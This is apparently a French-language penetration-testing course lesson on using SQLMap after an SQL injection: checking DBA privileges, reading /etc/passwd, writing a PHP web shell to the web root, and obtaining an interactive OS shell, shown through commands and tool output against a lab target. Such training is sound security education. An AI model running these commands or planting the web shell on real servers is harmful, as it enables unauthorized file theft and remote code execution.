Exploitation du système d'exploitation
======================================

* * * * *

SQLMap a la capacité d'utiliser une injection SQL pour lire et écrire des fichiers à partir du système local en dehors du SGBD. SQLMap peut également tenter de nous donner l'exécution directe de commandes sur l'hôte distant si nous disposions des privilèges appropriés.

* * * * *

Lecture/écriture de fichier
---------------------------

La première partie de l'exploitation du système d'exploitation via une vulnérabilité d'injection SQL consiste à lire et à écrire des données sur le serveur d'hébergement. La lecture de données est bien plus courante que l'écriture de données, strictement privilégiée dans les SGBD modernes, car elle peut conduire à une exploitation du système, comme nous le verrons. Par exemple, dans MySql, pour lire des fichiers locaux, l'utilisateur de la base de données doit avoir le privilège `LOAD DATA`et `INSERT`, pour pouvoir charger le contenu d'un fichier dans une table puis lire cette table.

Un exemple d'une telle commande est :

-   `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

Bien que nous n'ayons pas nécessairement besoin de privilèges d'administrateur de base de données (DBA) pour lire des données, cela devient de plus en plus courant dans les SGBD modernes. Il en va de même pour d'autres bases de données courantes. Néanmoins, si nous disposons des privilèges DBA, il est alors beaucoup plus probable que nous disposions de privilèges de lecture de fichiers.

* * * * *

Vérification des privilèges DBA
-------------------------------

Pour vérifier si nous avons les privilèges DBA avec SQLMap, nous pouvons utiliser l' `--is-dba`option :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:31:55 /2020-11-19/

[17:31:55] [INFO] resuming back-end DBMS 'mysql'
[17:31:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: False

[*] ending @ 17:31:56 /2020-11-19

```

Comme nous pouvons le voir, si nous testons cela sur l'un des exercices précédents, nous obtenons `current user is DBA: False`, ce qui signifie que nous n'avons pas d'accès DBA. Si nous essayions de lire un fichier à l'aide de SQLMap, nous obtiendrions quelque chose comme :

```
[17:31:43] [INFO] fetching file: '/etc/passwd'
[17:31:43] [ERROR] no data retrieved

```

Pour tester l'exploitation du système d'exploitation, essayons un exercice dans lequel nous disposons des privilèges DBA, comme le montrent les questions à la fin de cette section :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.11#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:37:47 /2020-11-19/

[17:37:47] [INFO] resuming back-end DBMS 'mysql'
[17:37:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: True

[*] ending @ 17:37:48 /2020-11-19/

```

Nous voyons que cette fois nous obtenons `current user is DBA: True`, ce qui signifie que nous pouvons avoir le privilège de lire les fichiers locaux.

* * * * *

Lecture de fichiers locaux
--------------------------

Au lieu d'injecter manuellement la ligne ci-dessus via SQLi, SQLMap facilite la lecture des fichiers locaux avec l' `--file-read`option :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:40:00 /2020-11-19/

[17:40:00] [INFO] resuming back-end DBMS 'mysql'
[17:40:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[17:40:01] [INFO] fetching file: '/etc/passwd'
[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
[17:40:07] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y

[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
files saved to [1]:
[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)

[*] ending @ 17:40:14 /2020-11-19/

```

Comme nous pouvons le voir, SQLMap a indiqué `files saved`un fichier local. Nous pouvons `cat`le fichier local pour voir son contenu :

```
dsgsec@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...

```

Nous avons récupéré avec succès le fichier distant.

* * * * *

Écriture de fichiers locaux
---------------------------

Lorsqu'il s'agit d'écrire des fichiers sur le serveur d'hébergement, cela devient beaucoup plus restreint dans les DMBS modernes, car nous pouvons l'utiliser pour écrire un Web Shell sur le serveur distant, et ainsi exécuter du code et prendre le contrôle du serveur.

C'est pourquoi les SGBD modernes désactivent l'écriture de fichiers par défaut et nécessitent certains privilèges pour que les administrateurs de base de données puissent écrire des fichiers. Par exemple, dans MySql, la `--secure-file-priv`configuration doit être désactivée manuellement pour permettre l'écriture de données dans des fichiers locaux à l'aide de la `INTO OUTFILE`requête SQL, en plus de tout accès local nécessaire sur le serveur hôte, comme le privilège d'écrire dans le répertoire dont nous avons besoin.

Néanmoins, de nombreuses applications Web nécessitent que les SGBD puissent écrire des données dans des fichiers. Il vaut donc la peine de tester si nous pouvons écrire des fichiers sur le serveur distant. Pour ce faire avec SQLMap, nous pouvons utiliser les options `--file-write`et `--file-dest`. Tout d'abord, préparons un shell Web PHP de base et écrivons-le dans un `shell.php`fichier :

```
dsgsec@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

```

Essayons maintenant d'écrire ce fichier sur le serveur distant, dans le `/var/www/html/`répertoire, la racine Web du serveur par défaut pour Apache. Si nous ne connaissons pas la racine Web du serveur, nous verrons comment SQLMap peut la trouver automatiquement.

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:54:18 /2020-11-19/

[17:54:19] [INFO] resuming back-end DBMS 'mysql'
[17:54:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y

[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

[*] ending @ 17:54:28 /2020-11-19/

```

On voit que SQLMap a confirmé que le fichier a bien été écrit :

```
[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

```

Maintenant, nous pouvons tenter d'accéder au shell PHP distant et exécuter un exemple de commande :

```
dsgsec@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la

total 148
drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...

```

Nous voyons que notre shell PHP a bien été écrit sur le serveur distant, et que nous avons effectivement une exécution de commandes sur le serveur hôte.

* * * * *

Exécution des commandes du système d'exploitation
-------------------------------------------------

Maintenant que nous avons confirmé que nous pouvions écrire un shell PHP pour exécuter des commandes, nous pouvons tester la capacité de SQLMap à nous fournir un shell de système d'exploitation simple sans écrire manuellement un shell distant. SQLMap utilise diverses techniques pour obtenir un shell distant via des vulnérabilités d'injection SQL, comme l'écriture d'un shell distant, comme nous venons de le faire, l'écriture de fonctions SQL qui exécutent des commandes et récupèrent la sortie ou même l'utilisation de certaines requêtes SQL qui exécutent directement des commandes du système d'exploitation, comme dans Microsoft SQL `xp_cmdshell`. Serveur. Pour obtenir un shell de système d'exploitation avec SQLMap, nous pouvons utiliser l' `--os-shell`option suivante :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:02:15 /2020-11-19/

[18:02:16] [INFO] resuming back-end DBMS 'mysql'
[18:02:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output

```

Nous voyons que SQLMap a utilisé par défaut la `UNION`technique pour obtenir un shell de système d'exploitation, mais n'a finalement pas réussi à nous donner de résultat `No output`. Donc, comme nous savons déjà que nous avons plusieurs types de vulnérabilités d'injection SQL, essayons de spécifier une autre technique qui a de meilleures chances de nous donner une sortie directe, comme la , `Error-based SQL Injection`que nous pouvons spécifier avec`--technique=E` :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:05:59 /2020-11-19/

[18:05:59] [INFO] resuming back-end DBMS 'mysql'
[18:05:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y

[18:06:07] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[18:06:09] [WARNING] unable to automatically parse any web server path
[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la

do you want to retrieve the command standard output? [Y/n/a] a

command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...

```

Comme nous pouvons le voir, cette fois, SQLMap nous a déposé avec succès dans un shell distant interactif simple, nous permettant d'exécuter facilement du code à distance via ce SQLi.

Remarque : SQLMap nous a d'abord demandé le type de langage utilisé sur ce serveur distant, que nous savons être PHP. Ensuite, il nous a demandé le répertoire racine Web du serveur et nous avons demandé à SQLMap de le trouver automatiquement à l'aide des « emplacement(s) commun(s) ». Ces deux options sont les options par défaut et auraient été automatiquement choisies si nous avions ajouté l'option « --batch » à SQLMap.

Avec cela, nous avons couvert toutes les fonctionnalités principales de SQLMap.
